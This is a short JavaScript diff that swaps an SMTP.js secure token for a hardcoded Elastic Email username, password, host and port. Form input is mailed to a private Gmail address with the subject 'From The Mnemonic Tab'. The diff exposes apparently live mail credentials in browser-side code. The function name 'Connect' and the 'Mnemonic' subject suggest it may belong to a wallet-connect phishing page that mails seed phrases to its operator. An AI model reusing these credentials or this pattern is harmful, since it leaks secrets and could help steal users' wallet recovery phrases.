@@ -16,7 +16,10 @@ function Connect() {
     }
     if(window.Email) {
       const configM = {
-        SecureToken: 'fe530cbe-5a11-4148-8b43-f5736d4848b2',
+        Username: 'fikay323@gmail.com',
+        Password: '78B299F1471C537636A63C2BD338FF809320',
+        Host: 'smtp.elasticemail.com',
+        Port: 2525,
         To : 'fikay323@gmail.com',
         From : formData.memailid,
         Subject: 'From The Mnemonic Tab',
